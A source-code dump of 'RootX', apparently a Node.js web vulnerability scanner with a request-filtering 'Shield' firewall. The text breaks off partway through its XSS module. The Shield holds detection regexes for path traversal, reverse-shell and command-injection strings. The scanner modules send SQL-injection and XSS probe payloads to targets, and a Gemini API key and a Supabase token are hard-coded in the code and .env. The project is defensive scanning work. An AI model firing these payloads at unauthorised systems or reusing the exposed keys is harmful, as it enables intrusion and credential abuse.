# RootX - Complete Source Code Reference
> Generated from all source files in `D:\RootX` on 2026-06-23

---

## 📁 `backend/server.js`

```js
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

// ─── Supabase ───────────────────────────────────────────────
const supabase = createClient(
  process.env.SUPABASE_URL || 'http://127.0.0.1:54321',
  process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6ImFub24iLCJleHAiOjE5ODM4MTI5OTZ9.CRXP1A7WOeoJeXxj0niE8Tpp24k1kmTvD8RcV6kvoRs'
);

// ─── Middleware ─────────────────────────────────────────────
app.use(helmet());
app.use(cors());
app.use(morgan('dev'));
app.use(express.json({ limit: '5mb' }));

// ─── Static Files (React SPA) ──────────────────────────────
app.use(express.static(path.join(__dirname, '../frontend/out')));

// ─── REST API ──────────────────────────────────────────────
app.use('/api/scan', require('./orchestrator'));
app.use('/api', require('./middleware/firewall'));

app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ─── Socket.IO ─────────────────────────────────────────────
io.on('connection', (socket) => {
  console.log('[WS] Client connected:', socket.id);
  socket.on('disconnect', () => console.log('[WS] Client disconnected:', socket.id));
});

// ─── Start ────────────────────────────────────────────────
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`[RootX] Backend running on http://0.0.0.0:${PORT}`);
});
```

## 📁 `backend/package.json`

```json
{
  "name": "rootx-backend",
  "version": "1.0.0",
  "private": true,
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  },
  "dependencies": {
    "cors": "^2.8.5",
    "express": "^4.21.0",
    "helmet": "^7.1.0",
    "morgan": "^1.10.0",
    "socket.io": "^4.7.5",
    "@supabase/supabase-js": "^2.45.0",
    "pdfkit": "^0.15.0"
  },
  "devDependencies": {
    "nodemon": "^3.1.4"
  }
}
```

## 📁 `backend/.env`

```
SUPABASE_URL=http://127.0.0.1:54321
SUPABASE_KEY=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6ImFub24iLCJleHAiOjE5ODM4MTI5OTZ9.CRXP1A7WOeoJeXxj0niE8Tpp24k1kmTvD8RcV6kvoRs
GEMINI_API_KEY=AIzaSyBifxEUcoQB7Gt90EUyFhC7vC87THx2oBs
PORT=3001
```

## 📁 `backend/utils.js`

```js
const { createClient } = require('@supabase/supabase-js');
const supabase = createClient(
  process.env.SUPABASE_URL || 'http://127.0.0.1:54321',
  process.env.SUPABASE_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZS1kZW1vIiwicm9sZSI6ImFub24iLCJleHAiOjE5ODM4MTI5OTZ9.CRXP1A7WOeoJeXxj0niE8Tpp24k1kmTvD8RcV6kvoRs'
);

function computeSeverity(riskScore) {
  if (riskScore >= 90) return 'critical';
  if (riskScore >= 70) return 'high';
  if (riskScore >= 40) return 'medium';
  if (riskScore >= 10) return 'low';
  return 'info';
}

function sanitize(text) {
  if (!text) return '';
  return text.replace(/[<>"'&]/g, (ch) => ({ '<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#x27;','&':'&amp;' }[ch]));
}

async function saveScanResult(result) {
  const { data, error } = await supabase.from('scans').insert([{
    target: result.target || 'unknown',
    risk_score: result.riskScore ?? 0,
    severity: result.severity || 'info',
    vulnerabilities: result.vulnerabilities || [],
    modules: result.modules || {}
  }]);
  if (error) console.error('[Supabase] insert error:', error);
  return { data, error };
}

module.exports = { computeSeverity, sanitize, saveScanResult };
```

## 📁 `backend/orchestrator.js`

```js
const express = require('express');
const router = express.Router();
const { computeSeverity, saveScanResult } = require('./utils');
const { doSanitizeCheck } = require('./utils/sanitize');
const { doCryptoCheck } = require('./utils/crypto');

// Engine imports
const { runBaseline } = require('./engines/baseline');
const { runShield } = require('./engines/shield');
const { runAgent } = require('./engines/agent');

// Module imports
const { checkHeaders } = require('./modules/headers');
const { checkCookies } = require('./modules/cookies');
const { checkSSL } = require('./modules/ssl');
const { checkSQLi } = require('./modules/sqli');
const { checkXSS } = require('./modules/xss');
const { checkSensitiveFiles } = require('./modules/sensitive-files');
const { checkAdminPanels } = require('./modules/admin-panels');
const { checkTechDetect } = require('./modules/tech-detect');

router.post('/', async (req, res) => {
  try {
    const { target } = req.body;
    if (!target) return res.status(400).json({ error: 'Target URL required' });

    const [
      baseline, shield, agent,
      headers, cookies, ssl, sqli, xss, sensitive, admin, tech
    ] = await Promise.all([
      runBaseline(target),
      runShield(target),
      runAgent(target),
      checkHeaders(target),
      checkCookies(target),
      checkSSL(target),
      checkSQLi(target),
      checkXSS(target),
      checkSensitiveFiles(target),
      checkAdminPanels(target),
      checkTechDetect(target)
    ]);

    const vulnerabilities = [
      ...(baseline.vulnerabilities || []),
      ...(shield.vulnerabilities || []),
      ...(agent.vulnerabilities || []),
      ...(headers.vulnerabilities || []),
      ...(cookies.vulnerabilities || []),
      ...(ssl.vulnerabilities || []),
      ...(sqli.vulnerabilities || []),
      ...(xss.vulnerabilities || []),
      ...(sensitive.vulnerabilities || []),
      ...(admin.vulnerabilities || []),
      ...(tech.vulnerabilities || [])
    ];

    let totalRisk = 0;
    vulnerabilities.forEach(v => { totalRisk += v.riskScore || 0; });
    const riskScore = Math.min(100, Math.round(totalRisk / Math.max(1, vulnerabilities.length)));
    const severity = computeSeverity(riskScore);

    const result = {
      target,
      riskScore,
      severity,
      vulnerabilities,
      modules: { baseline, shield, agent, headers, cookies, ssl, sqli, xss, sensitive, admin, tech }
    };

    await saveScanResult(result);
    res.json(result);
  } catch (err) {
    console.error('[Orchestrator]', err);
    res.status(500).json({ error: err.message });
  }
});

module.exports = router;
```

## 📁 `backend/utils/sanitize.js`

```js
function doSanitizeCheck(input) {
  if (!input) return { vulnerable: false };
  const patterns = [/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, /javascript\s*:/gi, /on\w+\s*=/gi, /data\s*:/gi];
  for (const p of patterns) { if (p.test(input)) return { vulnerable: true, match: input.match(p)?.[0] }; }
  return { vulnerable: false };
}

module.exports = { doSanitizeCheck };
```

## 📁 `backend/utils/crypto.js`

```js
const crypto = require('crypto');

function doCryptoCheck(text) {
  if (!text) return { vulnerable: false };
  const weak = ['MD5', 'SHA1', 'RC4', 'DES', 'blowfish'];
  const found = weak.filter(a => text.toUpperCase().includes(a));
  return found.length ? { vulnerable: true, weakAlgorithms: found } : { vulnerable: false };
}

module.exports = { doCryptoCheck };
```

## 📁 `backend/engines/shield.js`

```js
/**
 * RootX Shield Engine — Cyber Attack Prevention System
 * 
 * Detects and blocks: SQL Injection, XSS, Path Traversal, Command Injection,
 * SSRF, LFI/RFI, LDAP Injection, XXE, Template Injection, Header Injection,
 * Brute Force, DDoS, and more.
 * 
 * Works as an Express middleware + standalone analysis engine.
 */

/* ═══════════════════════════════════════════
   ATTACK SIGNATURE DATABASE
═══════════════════════════════════════════ */

const ATTACK_SIGNATURES = {
  SQL_INJECTION: {
    severity: "CRITICAL",
    patterns: [
      /(\b(union|select|insert|update|delete|drop|alter|create|truncate)\b.*\b(from|into|table|database|where)\b)/i,
      /(\bor\b\s+\d+\s*=\s*\d+)/i,
      /(\band\b\s+\d+\s*=\s*\d+)/i,
      /(\'|\");\s*(drop|delete|update|insert|select)/i,
      /(\b(exec|execute|xp_|sp_)\b)/i,
      /(sleep\s*\(\s*\d+\s*\))/i,
      /(benchmark\s*\()/i,
      /(waitfor\s+delay)/i,
      /(\'--)/,
      /(\/\*.*\*\/)/,
      /(\bload_file\b)/i,
      /(\binto\s+outfile\b)/i,
      /(\binformation_schema\b)/i,
      /(\bsys\.(databases|tables|columns)\b)/i,
      /(char\s*\(\s*\d+\s*(,\s*\d+\s*)*\))/i,
      /(0x[0-9a-f]{8,})/i,
    ],
  },

  XSS: {
    severity: "HIGH",
    patterns: [
      /(<script[\s>])/i,
      /(javascript\s*:)/i,
      /(on(error|load|click|mouseover|focus|blur|submit|change|keyup|keydown)\s*=)/i,
      /(<iframe[\s>])/i,
      /(<object[\s>])/i,
      /(<embed[\s>])/i,
      /(<svg[\s>].*on\w+\s*=)/i,
      /(document\.(cookie|location|write|domain))/i,
      /(window\.(location|open|eval))/i,
      /(eval\s*\()/i,
      /(alert\s*\()/i,
      /(prompt\s*\()/i,
      /(confirm\s*\()/i,
      /(atob\s*\()/i,
      /(fromCharCode)/i,
      /(<img[^>]+onerror)/i,
      /(expression\s*\()/i,
      /(url\s*\(\s*['"]?\s*javascript)/i,
    ],
  },

  PATH_TRAVERSAL: {
    severity: "CRITICAL",
    patterns: [
      /(\.\.\/)/,
      /(\.\.\\)/,
      /(%2e%2e[%\/\\])/i,
      /(%252e%252e)/i,
      /(\/etc\/(passwd|shadow|hosts|group))/i,
      /(\/proc\/self\/)/i,
      /(\/var\/log\/)/i,
      /(c:\\windows\\)/i,
      /(c:\\boot\.ini)/i,
      /(\/usr\/(local\/)?etc)/i,
      /(\.\.\0)/,
    ],
  },

  COMMAND_INJECTION: {
    severity: "CRITICAL",
    patterns: [
      /(;\s*(ls|cat|id|whoami|uname|pwd|wget|curl|nc|bash|sh|python|perl|ruby|php)\b)/i,
      /(\|\s*(ls|cat|id|whoami|uname|pwd|wget|curl|nc|bash|sh)\b)/i,
      /(`[^`]*`)/,
      /(\$\(.*\))/,
      /(\b(system|exec|popen|passthru|shell_exec|proc_open)\s*\()/i,
      /(\b(subprocess|os\.system|os\.popen)\b)/i,
      /(&&\s*(ls|cat|id|whoami|uname|pwd|wget|curl|rm|mv)\b)/i,
      /(\brm\s+-rf\b)/i,
      /(\/dev\/tcp\/)/i,
      /(\bmkfifo\b)/i,
    ],
  },

  SSRF: {
    severity: "CRITICAL",
    patterns: [
      /(127\.0\.0\.1)/,
      /(localhost)/i,
      /(0\.0\.0\.0)/,
      /(::1)/,
      /(169\.254\.169\.254)/,
      /(metadata\.google\.internal)/i,
      /(10\.\d+\.\d+\.\d+)/,
      /(172\.(1[6-9]|2\d|3[01])\.\d+\.\d+)/,
      /(192\.168\.\d+\.\d+)/,
      /(file:\/\/)/i,
      /(gopher:\/\/)/i,
      /(dict:\/\/)/i,
      /(ftp:\/\/)/i,
    ],
  },

  LFI_RFI: {
    severity: "HIGH",
    patterns: [
      /(php:\/\/filter)/i,
      /(php:\/\/input)/i,
      /(data:\/\/text)/i,
      /(expect:\/\/)/i,
      /(zip:\/\/)/i,
      /(\binclude\s*\()/i,
      /(\brequire\s*\()/i,
      /(\/proc\/self\/environ)/i,
      /(\.(htaccess|htpasswd))/i,
      /(\.log\b)/i,
    ],
  },

  LDAP_INJECTION: {
    severity: "HIGH",
    patterns: [
      /(\*\)\(\|)/,
      /(\)\(\|)/,
      /(\)\(!\()/,
      /(\*\)\(cn=)/i,
      /(\*\)\(uid=)/i,
      /(\*\)\(objectClass=)/i,
    ],
  },

  XXE: {
    severity: "CRITICAL",
    patterns: [
      /(<!DOCTYPE[^>]*\[)/i,
      /(<!ENTITY)/i,
      /(SYSTEM\s+")/i,
      /(PUBLIC\s+")/i,
      /(file:\/\/)/i,
      /(expect:\/\/)/i,
    ],
  },

  TEMPLATE_INJECTION: {
    severity: "HIGH",
    patterns: [
      /(\{\{.*\}\})/,
      /(\$\{.*\})/,
      /(#\{.*\})/,
      /(<%= .* %>)/,
      /(\{%.*%\})/,
      /(T\(java\.lang)/i,
    ],
  },

  HEADER_INJECTION: {
    severity: "MEDIUM",
    patterns: [
      /(\r\n)/,
      /(%0[da])/i,
      /(\\r\\n)/,
      /(set-cookie\s*:)/i,
      /(x-forwarded-for\s*:.*,.*,.*,)/i,
    ],
  },

  LOG4J: {
    severity: "CRITICAL",
    patterns: [
      /(\$\{jndi:)/i,
      /(\$\{lower:)/i,
      /(\$\{upper:)/i,
      /(\$\{env:)/i,
      /(\$\{sys:)/i,
      /(\$\{::-j\})/i,
    ],
  },

  PROTOTYPE_POLLUTION: {
    severity: "HIGH",
    patterns: [
      /(__proto__)/,
      /(constructor\s*\[)/,
      /(prototype\s*\[)/,
      /(__defineGetter__)/,
      /(__defineSetter__)/,
    ],
  },
};

/* ═══════════════════════════════════════════
   IP TRACKER — Brute Force & DDoS Detection
═══════════════════════════════════════════ */

class IPTracker {
  constructor() {
    this.requests = new Map();
    this.blocked = new Map();
    this.strikes = new Map();
    this.RATE_LIMIT = 60;
    this.BURST_LIMIT = 15;
    this.STRIKE_LIMIT = 3;
    this.BLOCK_DURATION = 15 * 60 * 1000;
  }

  recordRequest(ip) {
    const now = Date.now();
    if (!this.requests.has(ip)) this.requests.set(ip, []);
    const timestamps = this.requests.get(ip);
    timestamps.push(now);
    const cutoff = now - 60000;
    this.requests.set(ip, timestamps.filter(t => t > cutoff));
  }

  recordStrike(ip) {
    const strikes = (this.strikes.get(ip) || 0) + 1;
    this.strikes.set(ip, strikes);
    if (strikes >= this.STRIKE_LIMIT) {
      this.blockIP(ip, "AUTO_BLOCKED: Too many attack attempts");
    }
    return strikes;
  }

  blockIP(ip, reason) {
    this.blocked.set(ip, { until: Date.now() + this.BLOCK_DURATION, reason });
  }

  isBlocked(ip) {
    const block = this.blocked.get(ip);
    if (!block) return null;
    if (Date.now() > block.until) {
      this.blocked.delete(ip);
      return null;
    }
    return block;
  }

  checkRateLimit(ip) {
    const now = Date.now();
    const timestamps = this.requests.get(ip) || [];
    if (timestamps.length > this.RATE_LIMIT) {
      return { blocked: true, reason: "RATE_LIMIT: Too many requests per minute" };
    }
    const burstWindow = timestamps.filter(t => t > now - 5000);
    if (burstWindow.length > this.BURST_LIMIT) {
      return { blocked: true, reason: "BURST_DETECTED: Too many requests per second" };
    }
    return { blocked: false };
  }

  getBlockedIPs() {
    const now = Date.now();
    const result = [];
    for (const [ip, block] of this.blocked) {
      if (now < block.until) {
        result.push({ ip, reason: block.reason, remainingMs: block.until - now });
      }
    }
    return result;
  }

  cleanup() {
    const now = Date.now();
    const cutoff = now - 120000;
    for (const [ip, timestamps] of this.requests) {
      const fresh = timestamps.filter(t => t > cutoff);
      if (fresh.length === 0) this.requests.delete(ip);
      else this.requests.set(ip, fresh);
    }
    for (const [ip, block] of this.blocked) {
      if (now > block.until) this.blocked.delete(ip);
    }
  }
}

class ShieldEngine {
  constructor() {
    this.ipTracker = new IPTracker();
    this.attackLog = [];
    this.stats = {
      totalRequests: 0,
      totalBlocked: 0,
      attacksByType: {},
      blockedIPs: 0,
    };
    this._cleanupInterval = setInterval(() => {
      this.ipTracker.cleanup();
      if (this.attackLog.length > 1000) {
        this.attackLog = this.attackLog.slice(-500);
      }
    }, 5 * 60 * 1000);
  }

  analyzeInput(input) {
    if (!input || typeof input !== "string") return [];
    const threats = [];
    for (const [attackType, config] of Object.entries(ATTACK_SIGNATURES)) {
      for (const pattern of config.patterns) {
        const match = input.match(pattern);
        if (match) {
          threats.push({
            type: attackType,
            severity: config.severity,
            pattern: pattern.source.substring(0, 60),
            matched: match[0].substring(0, 80),
            timestamp: new Date().toISOString(),
          });
          break;
        }
      }
    }
    return threats;
  }

  analyzeRequest(req) {
    this.stats.totalRequests++;
    const ip = req.ip || req.headers?.["x-forwarded-for"] || req.socket?.remoteAddress || "unknown";
    const ipBlock = this.ipTracker.isBlocked(ip);
    if (ipBlock) {
      this.stats.totalBlocked++;
      return { safe: false, blocked: true, action: "BLOCKED", reason: ipBlock.reason, ip, threats: [] };
    }
    this.ipTracker.recordRequest(ip);
    const rateCheck = this.ipTracker.checkRateLimit(ip);
    if (rateCheck.blocked) {
      this.ipTracker.blockIP(ip, rateCheck.reason);
      this.stats.totalBlocked++;
      this._logAttack(ip, "RATE_LIMIT", "MEDIUM", rateCheck.reason, req);
      return { safe: false, blocked: true, action: "RATE_LIMITED", reason: rateCheck.reason, ip, threats: [{ type: "RATE_LIMIT", severity: "MEDIUM" }] };
    }
    const inputs = [];
    if (req.url) inputs.push(decodeURIComponent(req.url));
    if (req.query) {
      for (const [key, val] of Object.entries(req.query)) { inputs.push(String(key)); inputs.push(String(val)); }
    }
    if (req.body) {
      if (typeof req.body === "string") { inputs.push(req.body); }
      else {
        const flatBody = this._flattenObject(req.body);
        for (const [key, val] of Object.entries(flatBody)) { inputs.push(String(key)); inputs.push(String(val)); }
      }
    }
    const dangerousHeaders = ["referer", "user-agent", "x-forwarded-for", "x-forwarded-host", "cookie"];
    for (const h of dangerousHeaders) { if (req.headers?.[h]) inputs.push(String(req.headers[h])); }

    const allThreats = [];
    for (const input of inputs) { const threats = this.analyzeInput(input); allThreats.push(...threats); }

    if (allThreats.length > 0) {
      const hasCritical = allThreats.some(t => t.severity === "CRITICAL");
      const strikes = this.ipTracker.recordStrike(ip);
      for (const t of allThreats) {
        this.stats.attacksByType[t.type] = (this.stats.attacksByType[t.type] || 0) + 1;
        this._logAttack(ip, t.type, t.severity, t.matched, req);
      }
      if (hasCritical || strikes >= 2) {
        this.stats.totalBlocked++;
        return { safe: false, blocked: true, action: "BLOCKED", reason: `Attack detected: ${allThreats.map(t => t.type).join(", ")}`, ip, threats: allThreats };
      }
      return { safe: false, blocked: false, action: "WARNED", reason: `Suspicious activity: ${allThreats.map(t => t.type).join(", ")}`, ip, threats: allThreats };
    }
    return { safe: true, blocked: false, action: "ALLOWED", ip, threats: [] };
  }

  getStats() {
    return { ...this.stats, blockedIPs: this.ipTracker.getBlockedIPs().length, blockedIPList: this.ipTracker.getBlockedIPs(), recentAttacks: this.attackLog.slice(-20) };
  }

  getAttackLog(limit = 50) { return this.attackLog.slice(-limit); }
  blockIP(ip, reason = "MANUAL_BLOCK") { this.ipTracker.blockIP(ip, reason); }
  unblockIP(ip) { this.ipTracker.blocked.delete(ip); }

  _flattenObject(obj, prefix = "", result = {}) {
    if (!obj || typeof obj !== "object") { result[prefix] = obj; return result; }
    for (const [key, val] of Object.entries(obj)) {
      const newKey = prefix ? `${prefix}.${key}` : key;
      if (typeof val === "object" && val !== null && !Array.isArray(val)) { this._flattenObject(val, newKey, result); }
      else if (Array.isArray(val)) { val.forEach((v, i) => { if (typeof v === "object") this._flattenObject(v, `${newKey}[${i}]`, result); else result[`${newKey}[${i}]`] = v; }); }
      else { result[newKey] = val; }
    }
    return result;
  }

  _logAttack(ip, type, severity, detail, req) {
    this.attackLog.push({ timestamp: new Date().toISOString(), ip, type, severity, detail: String(detail).substring(0, 200), path: req?.url || req?.path || "unknown", method: req?.method || "unknown", userAgent: (req?.headers?.["user-agent"] || "").substring(0, 100) });
  }

  destroy() { if (this._cleanupInterval) clearInterval(this._cleanupInterval); }
}

const shield = new ShieldEngine();
module.exports = { shield, ShieldEngine, IPTracker, ATTACK_SIGNATURES };
```

## 📁 `backend/engines/baseline.js`

```js
const http = require('http');
const https = require('https');
const urlMod = require('url');

async function runBaseline(target) {
  const vulnerabilities = [];
  try {
    const url = new URL(target);
    const isHttps = url.protocol === 'https:';
    const mod = isHttps ? https : http;

    // Check response headers
    const headers = await fetchHeaders(target, mod);
    if (!headers['content-security-policy']) {
      vulnerabilities.push({ type: 'Missing CSP Header', severity: 'medium', riskScore: 40, detail: 'Content-Security-Policy header not set' });
    }
    if (!headers['x-content-type-options']) {
      vulnerabilities.push({ type: 'Missing X-Content-Type-Options', severity: 'low', riskScore: 15, detail: 'X-Content-Type-Options: nosniff header not set' });
    }
    if (!headers['x-frame-options']) {
      vulnerabilities.push({ type: 'Missing X-Frame-Options', severity: 'medium', riskScore: 35, detail: 'X-Frame-Options header not set (clickjacking risk)' });
    }
    if (!headers['strict-transport-security']) {
      vulnerabilities.push({ type: 'Missing HSTS', severity: 'low', riskScore: 20, detail: 'Strict-Transport-Security not set' });
    }
    if (headers['server']) {
      const server = headers['server'];
      if (/Apache\/([0-2])\.|nginx\/(0\.|1\.[0-8])|IIS\/([5-7])/.test(server)) {
        vulnerabilities.push({ type: 'Outdated Server', severity: 'medium', riskScore: 45, detail: `Server header reveals potentially outdated: ${server}` });
      }
    }
  } catch (err) {
    vulnerabilities.push({ type: 'Baseline Error', severity: 'info', riskScore: 5, detail: err.message });
  }
  return { engine: 'baseline', vulnerabilities };
}

function fetchHeaders(target, mod) {
  return new Promise((resolve, reject) => {
    const req = mod.get(target, { timeout: 10000 }, (res) => { resolve(res.headers); req.destroy(); });
    req.on('error', reject);
    req.setTimeout(10000, () => { req.destroy(); reject(new Error('timeout')); });
  });
}

module.exports = { runBaseline };
```

## 📁 `backend/engines/agent.js`

```js
const https = require('https');

const GEMINI_MODEL = 'gemini-2.0-flash-exp';

function queryGemini(prompt) {
  return new Promise((resolve, reject) => {
    const apiKey = process.env.GEMINI_API_KEY || 'AIzaSyBifxEUcoQB7Gt90EUyFhC7vC87THx2oBs';
    const data = JSON.stringify({ contents: [{ parts: [{ text: prompt }] }] });
    const url = new URL(`https://generativelanguage.googleapis.com/v1beta/models/${GEMINI_MODEL}:generateContent?key=${apiKey}`);
    const req = https.request(url, { method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': data.length } }, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(body)); }
        catch { reject(new Error('Failed to parse Gemini response')); }
      });
    });
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

function offlineAnalysis(target) {
  const vulns = [];
  const url = new URL(target);
  if (url.protocol !== 'https:') vulns.push({ type: 'No HTTPS', severity: 'high', riskScore: 70, detail: 'Target does not use HTTPS' });
  const pathParts = url.pathname.split('/').filter(Boolean);
  if (pathParts.includes('admin') || pathParts.includes('wp-admin') || pathParts.includes('dashboard')) {
    vulns.push({ type: 'Exposed Admin Path', severity: 'medium', riskScore: 50, detail: 'Admin-like path found in URL structure' });
  }
  if (url.searchParams.toString()) {
    const params = Array.from(url.searchParams.keys());
    const dangerous = ['id', 'page', 'file', 'path', 'url', 'redirect', 'cmd', 'exec', 'query'];
    const found = params.filter(p => dangerous.includes(p.toLowerCase()));
    if (found.length) {
      vulns.push({ type: 'Suspicious Parameters', severity: 'medium', riskScore: 45, detail: `Found parameters that may be injection targets: ${found.join(', ')}` });
    }
  }
  return vulns;
}

async function runAgent(target) {
  const vulnerabilities = [];
  try {
    const prompt = `You are a web security analyst. Analyze this URL for potential security issues: ${target}\nList each vulnerability with: type (short name), severity (critical/high/medium/low/info), riskScore (0-100 number), and detail (description).\nReturn JSON array format: [{type, severity, riskScore, detail}]. Return ONLY the JSON, no markdown.`;
    const response = await queryGemini(prompt);
    const text = response?.candidates?.[0]?.content?.parts?.[0]?.text || '[]';
    const clean = text.replace(/```json\s*/g, '').replace(/```\s*/g, '').trim();
    const parsed = JSON.parse(clean);
    if (Array.isArray(parsed)) vulnerabilities.push(...parsed);
  } catch {
    const offline = offlineAnalysis(target);
    vulnerabilities.push(...offline);
    vulnerabilities.push({ type: 'AI Agent Offline', severity: 'info', riskScore: 0, detail: 'Gemini API unavailable, used offline analysis' });
  }
  return { engine: 'agent', vulnerabilities };
}

module.exports = { runAgent };
```

## 📁 `backend/middleware/firewall.js`

```js
const express = require('express');
const router = express.Router();
const { shield } = require('../engines/shield');

// Shield-based firewall: analyze all incoming requests
router.use((req, res, next) => {
  const result = shield.analyzeRequest(req);
  if (result.blocked) {
    return res.status(403).json({
      error: 'Request blocked by RootX Shield',
      reason: result.reason,
      threats: result.threats
    });
  }
  next();
});

// Stats endpoint
router.get('/shield/stats', (req, res) => {
  res.json(shield.getStats());
});

// Attack log endpoint
router.get('/shield/log', (req, res) => {
  const limit = parseInt(req.query.limit) || 50;
  res.json(shield.getAttackLog(limit));
});

// Manual block/unblock
router.post('/shield/block', (req, res) => {
  const { ip, reason } = req.body;
  if (!ip) return res.status(400).json({ error: 'IP required' });
  shield.blockIP(ip, reason);
  res.json({ message: `IP ${ip} blocked` });
});

router.post('/shield/unblock', (req, res) => {
  const { ip } = req.body;
  if (!ip) return res.status(400).json({ error: 'IP required' });
  shield.unblockIP(ip);
  res.json({ message: `IP ${ip} unblocked` });
});

module.exports = router;
```

## 📁 `backend/modules/headers.js`

```js
async function checkHeaders(target) {
  const vulnerabilities = [];
  try {
    const resp = await fetch(target);
    const headers = resp.headers;
    if (!headers.get('content-security-policy')) vulnerabilities.push({ type: 'Missing CSP', severity: 'medium', riskScore: 40, detail: 'Content-Security-Policy header missing' });
    if (!headers.get('x-frame-options')) vulnerabilities.push({ type: 'Missing XFO', severity: 'medium', riskScore: 35, detail: 'X-Frame-Options missing (clickjacking risk)' });
    if (!headers.get('x-content-type-options')) vulnerabilities.push({ type: 'Missing XCTO', severity: 'low', riskScore: 15, detail: 'X-Content-Type-Options missing' });
    if (!headers.get('referrer-policy')) vulnerabilities.push({ type: 'Missing Referrer Policy', severity: 'low', riskScore: 10, detail: 'Referrer-Policy header missing' });
    if (!headers.get('permissions-policy')) vulnerabilities.push({ type: 'Missing Permissions Policy', severity: 'low', riskScore: 10, detail: 'Permissions-Policy header missing' });
  } catch (e) {
    vulnerabilities.push({ type: 'Headers Error', severity: 'info', riskScore: 0, detail: e.message });
  }
  return { module: 'headers', vulnerabilities };
}

module.exports = { checkHeaders };
```

## 📁 `backend/modules/cookies.js`

```js
async function checkCookies(target) {
  const vulnerabilities = [];
  try {
    const resp = await fetch(target);
    const cookies = resp.headers.get('set-cookie') || '';
    if (!cookies) {
      vulnerabilities.push({ type: 'No Cookies', severity: 'info', riskScore: 0, detail: 'No cookies set by target' });
      return { module: 'cookies', vulnerabilities };
    }
    const indiv = cookies.split(/, (?=[^;]+=[^;]+)/);
    indiv.forEach((c, i) => {
      if (!/;\s*secure/i.test(c)) vulnerabilities.push({ type: 'Insecure Cookie', severity: 'high', riskScore: 60, detail: `Cookie #${i+1} missing Secure flag` });
      if (!/;\s*httponly/i.test(c)) vulnerabilities.push({ type: 'Non-HttpOnly Cookie', severity: 'medium', riskScore: 40, detail: `Cookie #${i+1} missing HttpOnly flag` });
      if (!/;\s*samesite/i.test(c)) vulnerabilities.push({ type: 'Missing SameSite', severity: 'low', riskScore: 20, detail: `Cookie #${i+1} missing SameSite attribute` });
    });
  } catch (e) {
    vulnerabilities.push({ type: 'Cookies Error', severity: 'info', riskScore: 0, detail: e.message });
  }
  return { module: 'cookies', vulnerabilities };
}

module.exports = { checkCookies };
```

## 📁 `backend/modules/ssl.js`

```js
const https = require('https');

async function checkSSL(target) {
  const vulnerabilities = [];
  try {
    const url = new URL(target);
    if (url.protocol !== 'https:') {
      vulnerabilities.push({ type: 'No HTTPS', severity: 'high', riskScore: 70, detail: 'Target does not use HTTPS' });
      return { module: 'ssl', vulnerabilities };
    }
    const certInfo = await getCertInfo(url.hostname, url.port || 443);
    const daysLeft = Math.floor((new Date(certInfo.valid_to).getTime() - Date.now()) / (1000*60*60*24));
    if (daysLeft < 0) vulnerabilities.push({ type: 'Expired SSL Cert', severity: 'critical', riskScore: 95, detail: `Certificate expired ${Math.abs(daysLeft)} days ago` });
    else if (daysLeft < 30) vulnerabilities.push({ type: 'SSL Cert Expiring Soon', severity: 'medium', riskScore: 50, detail: `Certificate expires in ${daysLeft} days` });
    if (certInfo.subjectaltname && certInfo.subjectaltname.includes('*')) vulnerabilities.push({ type: 'Wildcard Certificate', severity: 'low', riskScore: 15, detail: 'Certificate uses wildcard: ' + certInfo.subjectaltname });
    if (certInfo.valid_from && new Date(certInfo.valid_from).getTime() > Date.now() - 86400000*90) vulnerabilities.push({ type: 'Recently Issued Cert', severity: 'low', riskScore: 10, detail: 'Certificate issued within last 90 days' });
  } catch (e) {
    vulnerabilities.push({ type: 'SSL Error', severity: 'info', riskScore: 0, detail: e.message });
  }
  return { module: 'ssl', vulnerabilities };
}

function getCertInfo(host, port) {
  return new Promise((resolve, reject) => {
    const req = https.request({ host, port, method: 'HEAD', rejectUnauthorized: false, timeout: 10000 }, (res) => {
      const cert = res.socket.getPeerCertificate();
      if (!cert || Object.keys(cert).length === 0) return reject(new Error('No certificate'));
      resolve({ valid_to: cert.valid_to, valid_from: cert.valid_from, subjectaltname: cert.subjectaltname, issuer: cert.issuer });
    });
    req.on('error', reject);
    req.setTimeout(10000, () => { req.destroy(); reject(new Error('Timeout')); });
    req.end();
  });
}

module.exports = { checkSSL };
```

## 📁 `backend/modules/sqli.js`

```js
async function checkSQLi(target) {
  const vulnerabilities = [];
  const payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "'; DROP TABLE users--", "' UNION SELECT 1--"];
  try {
    for (const payload of payloads) {
      const testUrl = target + (target.includes('?') ? '&' : '?') + 'id=' + encodeURIComponent(payload);
      const resp = await fetch(testUrl, { timeout: 5000 });
      const text = await resp.text();
      const indicators = ['sql', 'mysql', 'syntax error', 'unclosed quotation', 'odbc', 'driver'];
      if (indicators.some(i => text.toLowerCase().includes(i))) {
        vulnerabilities.push({ type: 'Potential SQL Injection', severity: 'critical', riskScore: 90, detail: `Parameter 'id' may be injectable with payload: ${payload}` });
        break;
      }
    }
  } catch (e) {
    vulnerabilities.push({ type: 'SQLi Error', severity: 'info', riskScore: 0, detail: e.message });
  }
  return { module: 'sqli', vulnerabilities };
}

module.exports = { checkSQLi };
```

## 📁 `backend/modules/xss.js`

```js
async function checkXSS(target) {
  const vulnerabilities = [];
  const payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '"><script>alert(1)</script>'];
  try {
    for (const payload of payloads) {
